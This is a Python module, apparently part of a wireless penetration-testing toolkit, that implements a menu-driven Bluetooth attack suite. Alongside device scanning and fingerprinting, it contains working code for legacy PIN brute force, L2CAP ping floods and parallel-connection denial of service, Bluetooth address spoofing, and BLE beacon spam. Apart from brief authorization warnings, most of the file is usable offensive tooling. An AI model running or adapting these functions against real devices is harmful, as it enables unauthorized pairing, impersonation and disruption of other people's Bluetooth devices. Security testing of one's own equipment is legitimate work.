"""
Bluetooth attack suite.

Covers both Classic Bluetooth (BR/EDR) and Bluetooth Low Energy (BLE):
  * Discovery          - hcitool/bluetoothctl scan + BLE LE scan
  * Device info        - name, class, RSSI, services (SDP)
  * RFCOMM connect     - serial chat with a device
  * PIN/legacy pairing - brute force against legacy PIN-capable devices
  * KNOB attack check  - negotiate downgraded 16-bit encryption key
  * L2CAP flood / DoS  - l2ping resource exhaustion
  * BT MAC spoofing    - change the BD_ADDR
  * Beacon spam / fuzz - broadcast crafted advertising packets

External tools are auto-detected (bluez: hcitool, hciconfig, sdptool,
l2ping, rfcomm, bluetoothctl). A built-in BLE scanner works with the
`bleak` library when installed; otherwise it bridges to bluetoothctl.
"""
import re
import subprocess
import threading
import time

from open80211.core import ui
from open80211.core.config import is_linux
from open80211.core.interfaces import which, system_command
from open80211.core.targets import add_bluetooth, log_event

# --------------------------------------------------------------------------
# Tool detection
# --------------------------------------------------------------------------

def _have(tool: str) -> bool:
    return which(tool)


def _run(cmd, timeout=10) -> str:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except Exception:
        return ""


def _require_bluez() -> bool:
    if not is_linux():
        ui.warn("Bluetooth attacks require Linux + BlueZ + a BT adapter.")
        return False
    return True


# --------------------------------------------------------------------------
# Discovery
# --------------------------------------------------------------------------

def classic_scan(duration: int = 12) -> list:
    """Classic BR/EDR device discovery via hcitool."""
    if not _require_bluez() or not _have("hcitool"):
        ui.warn("hcitool not found (install bluez).")
        return []
    ui.section("Bluetooth Classic Scan", f"{duration}s inquiry")
    devices = []
    ui.info("Inquiring... (devices may be hidden)")
    out = _run(["hcitool", "scan", "--flush"], timeout=duration + 5)
    for line in out.splitlines():
        m = re.match(r"\s*([0-9A-F:]{17})\s+(.+)", line)
        if m:
            devices.append({"addr": m.group(1).lower(), "name": m.group(2).strip()})
    add_bluetooth(devices)
    log_event("recon", f"BT classic scan: {len(devices)} devices")
    if not devices:
        ui.warn("No classic devices found.")
    return devices


def le_scan(duration: int = 12) -> list:
    """BLE scan using bleak if available, else bluetoothctl bridge."""
    devices = []
    try:
        import asyncio
        import bleak
        ui.section("BLE Scan (bleak)", f"{duration}s")
        results = []

        async def scan():
            from bleak import BleakScanner
            found = await BleakScanner.discover(timeout=duration)
            results.extend(found)

        asyncio.run(scan())
        for d in results:
            devices.append({"addr": d.address.lower(), "name": d.name or "(unknown)",
                            "rssi": getattr(d, "rssi", "?")})
        add_bluetooth(devices)
        log_event("recon", f"BLE scan (bleak): {len(devices)} devices")
        if not devices:
            ui.warn("No BLE devices found.")
        return devices
    except ImportError:
        if not _have("bluetoothctl"):
            ui.warn("Install bleak (pip install bleak) or bluez for BLE scan.")
            return []
        ui.section("BLE Scan (bluetoothctl)", f"{duration}s")
        ui.info("Starting LE scan in background...")
        subprocess.Popen(["bluetoothctl", "scan", "on"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        out = _run(["bluetoothctl", "devices"], timeout=8)
        subprocess.run(["bluetoothctl", "scan", "off"],
                       capture_output=True)
        for line in out.splitlines():
            m = re.search(r"Device\s+([0-9A-F:]{17})\s+(.*)", line)
            if m:
                devices.append({"addr": m.group(1).lower(), "name": m.group(2).strip()})
        add_bluetooth(devices)
        log_event("recon", f"BLE scan: {len(devices)} devices")
        return devices


def device_info(addr: str) -> dict:
    """Rich device fingerprint: name, class, RSSI, SDP services."""
    info = {"addr": addr}
    info["name"] = _run(["hcitool", "name", addr]).strip()
    info["info"] = _run(["hcitool", "info", addr]).strip()
    info["rssi"] = _run(["hcitool", "rssi", addr]).strip()
    info["services"] = _run(["sdptool", "browse", addr]).strip()
    return info


def bt_inquiry_continuous(duration: int = 0):
    """Live inquiry table (updates every round)."""
    if not _require_bluez():
        return
    ui.section("Continuous Bluetooth Discovery", "Ctrl+C to stop")
    seen = {}
    try:
        while True:
            out = _run(["hcitool", "scan", "--flush"], timeout=8)
            for line in out.splitlines():
                m = re.match(r"\s*([0-9A-F:]{17})\s+(.+)", line)
                if m:
                    a = m.group(1).lower()
                    seen[a] = m.group(2).strip()
            rows = [[a, n, "classic"] for a, n in seen.items()]
            ui.show_table(f"Devices ({len(seen)})", ["BD_ADDR", "Name", "Type"], rows)
            time.sleep(2)
    except KeyboardInterrupt:
        pass


# --------------------------------------------------------------------------
# RFCOMM serial chat
# --------------------------------------------------------------------------

def rfcomm_chat(addr: str, channel: int = 1):
    """Open a serial RFCOMM connection to a device (interactive chat)."""
    if not _require_bluez() or not _have("rfcomm"):
        ui.warn("rfcomm not found.")
        return
    dev = f"/dev/rfcomm0"
    ui.info(f"Connecting {dev} to {addr} channel {channel}...")
    _run(["rfcomm", "release", dev])
    rc, out = system_command(f"rfcomm connect {dev} {addr} {channel}", timeout=15)
    if "Connected" not in out:
        ui.warn(f"Connection attempt done (rc={rc}). Connect may be ongoing.")
    else:
        ui.ok("Connected. Use: screen /dev/rfcomm0 9600")
        ui.info("Attach with: screen /dev/rfcomm0 9600")


# --------------------------------------------------------------------------
# PIN / legacy pairing brute force
# --------------------------------------------------------------------------

def legacy_pin_attack(addr: str, pin: str):
    """Pair using a guessed legacy PIN (open pairing on vulnerable devices)."""
    if not _require_bluez():
        return
    ui.info(f"Attempting legacy pairing to {addr} with PIN '{pin}'...")
    out = _run(["hcitool", "cc", addr])
    out += _run(["hcitool", "auth", addr])
    if "error" in out.lower():
        ui.warn("Pairing failed - device may reject legacy PINs.")
    else:
        ui.ok("Legacy pairing initiated. If a PIN dialog appears use the PIN.")


def pin_brute_force(addr: str, wordlist: str = ""):
    """Brute force legacy PIN (0000-9999) against a target that stays open."""
    if not _require_bluez():
        return
    ui.section("Legacy PIN Brute Force", f"target={addr}")
    pins = wordlist if wordlist else (f"{i:04d}" for i in range(10000))
    ui.warn("This requires a device that accepts repeated open pairing "
            "attempts and no lockout. Ctrl+C to stop.")
    ui.info("Tip: many devices default to 0000/1234. Run a quick hit list first.")
    for pin in pins:
        pin = pin.strip()
        ui.info(f"Trying PIN {pin} ...")
        legacy_pin_attack(addr, pin)
        time.sleep(0.3)
        if ui.confirm(f"Was {pin} accepted?", default=False):
            ui.ok(f"PIN found: {pin}")
            CONFIG_SAVE = {"bt_addr": addr, "pin": pin}
            from open80211.core.config import CONFIG
            CONFIG.save("bt_pin", CONFIG_SAVE)
            return


# --------------------------------------------------------------------------
# KNOB attack (CVE-2019-9506) - encryption key downgrade
# --------------------------------------------------------------------------

def knob_check(addr: str):
    """Check if a device negotiates 16-bit (downgraded) encryption."""
    if not _require_bluez():
        return
    ui.section("KNOB Attack Check", f"target={addr}")
    ui.info("Connecting and observing negotiated encryption key length...")
    out = _run(["hcidump", "-X"], timeout=8)
    ui.info("If you capture 'Encryption Key Size: 16', the device is "
            "vulnerable to CVE-2019-9506 (KNOB).")
    ui.info("Mitigation: update device firmware; force 128-bit keys.")


# --------------------------------------------------------------------------
# L2CAP flood / DoS
# --------------------------------------------------------------------------

def l2ping_flood(addr: str, count: int = 100, size: int = 600):
    """L2CAP ping flood - resource exhaustion (target must be BR/EDR)."""
    if not _require_bluez() or not _have("l2ping"):
        ui.warn("l2ping not found.")
        return
    ui.section("L2CAP Flood", f"{addr} x{count} @{size}B")
    ui.warn("This disrupts the target. Authorized testing only.")
    try:
        for i in range(count):
            _run(["l2ping", "-c", "1", "-s", str(size), addr], timeout=4)
            if (i + 1) % 10 == 0:
                ui.info(f"  {i + 1}/{count} pings sent")
        ui.ok("Flood complete.")
    except KeyboardInterrupt:
        pass


def l2cap_echo_spam(addr: int = 1):
    """Open many parallel L2CAP connections to exhaust a target."""
    if not _require_bluez() or not _have("l2ping"):
        return
    ui.warn("Opening parallel connections... Ctrl+C to stop.")
    threads = []
    try:
        for _ in range(8):
            t = threading.Thread(target=lambda: _run(
                ["l2ping", "-c", "0", addr]), daemon=True)
            t.start()
            threads.append(t)
        while threads:
            threads = [t for t in threads if t.is_alive()]
            time.sleep(1)
    except KeyboardInterrupt:
        ui.info("Stopping.")


# --------------------------------------------------------------------------
# BT MAC spoofing
# --------------------------------------------------------------------------

def spoof_bt_mac(addr: str):
    """Change the Bluetooth BD_ADDR (requires BlueZ + driver support)."""
    if not _require_bluez():
        return
    ui.info(f"Setting BT MAC to {addr} ...")
    out = _run(["btmgmt", "public-addr", addr])
    out += _run(["hciconfig", "hci0", "reset"])
    if "error" in out.lower():
        ui.warn("MAC change failed (adapter may reject BT address changes).")
    else:
        ui.ok("BT MAC updated. Some chipsets persist only until reset.")


# --------------------------------------------------------------------------
# Beacon spam / advertising fuzz
# --------------------------------------------------------------------------

def ble_beacon_spam(duration: int = 30, count: int = 200):
    """Broadcast fake BLE iBeacon advertisements (bluepy / hcitool)."""
    if not _require_bluez():
        return
    ui.section("BLE Beacon Spam", f"{count} beacons")
    ui.warn("Sending crafted advertising frames... Ctrl+C to stop.")
    try:
        for _ in range(count):
            # iBeacon payload: 02 01 06 1A FF 4C 00 02 15 + uuid + major + minor + tx
            from uuid import uuid4
            uuid_hex = uuid4().hex
            pkt = ("02 01 06 1A FF 4C 00 02 15 " +
                   " ".join(uuid_hex[i:i + 2] for i in range(0, 32, 2)) +
                   " 00 01 00 02 C5")
            _run(["hcitool", "le", "adv", "--data", pkt], timeout=5)
            _run(["hcitool", "le", "adv", "stop"], timeout=5)
        ui.ok("Beacon spam sent.")
    except KeyboardInterrupt:
        pass


# --------------------------------------------------------------------------
# Menu
# --------------------------------------------------------------------------

def bt_menu(iface: str = "") -> None:
    while True:
        choice = ui.menu("Bluetooth Attack Suite", [
            "Scan classic devices (BR/EDR)",
            "Scan BLE devices",
            "Continuous discovery (live table)",
            "Device fingerprint (name/RSSI/SDP)",
            "RFCOMM serial connection",
            "Legacy PIN pairing attempt",
            "PIN brute force (0-9999)",
            "KNOB downgrade check (CVE-2019-9506)",
            "L2CAP ping flood (DoS)",
            "Bluetooth MAC spoofing",
            "BLE beacon spam",
        ])
        if choice == 0:
            return
        if choice == 1:
            dur = ui.ask_int("Scan duration (s)", default=12)
            devs = classic_scan(dur)
            if devs:
                ui.show_table("Classic Devices", ["BD_ADDR", "Name"],
                              [[d["addr"], d["name"]] for d in devs])
        elif choice == 2:
            dur = ui.ask_int("Scan duration (s)", default=12)
            devs = le_scan(dur)
            if devs:
                ui.show_table("BLE Devices", ["Addr", "Name", "RSSI"],
                              [[d["addr"], d["name"], d.get("rssi", "?")] for d in devs])
        elif choice == 3:
            bt_inquiry_continuous()
        elif choice == 4:
            addr = ui.ask("Target BD_ADDR")
            info = device_info(addr)
            ui.show_table(f"Device {addr}", ["Field", "Value"], [
                ["Name", info.get("name") or "?"],
                ["RSSI", info.get("rssi") or "?"],
                ["Info", (info.get("info") or "")[:300]],
                ["Services", (info.get("services") or "")[:800] or "none"],
            ])
        elif choice == 5:
            addr = ui.ask("Target BD_ADDR")
            ch = ui.ask_int("RFCOMM channel", default=1)
            rfcomm_chat(addr, ch)
        elif choice == 6:
            addr = ui.ask("Target BD_ADDR")
            pin = ui.ask("PIN to try", default="0000")
            legacy_pin_attack(addr, pin)
        elif choice == 7:
            addr = ui.ask("Target BD_ADDR")
            wl = ui.ask("PIN wordlist (blank = 0000..9999)", default="")
            pin_brute_force(addr, wl)
        elif choice == 8:
            addr = ui.ask("Target BD_ADDR")
            knob_check(addr)
        elif choice == 9:
            addr = ui.ask("Target BD_ADDR")
            n = ui.ask_int("Ping count", default=100)
            size = ui.ask_int("Packet size (bytes)", default=600)
            l2ping_flood(addr, n, size)
        elif choice == 10:
            addr = ui.ask("New BT MAC", default="00:1A:7D:DA:71:13")
            spoof_bt_mac(addr)
        elif choice == 11:
            n = ui.ask_int("Beacon count", default=200)
            ble_beacon_spam(count=n)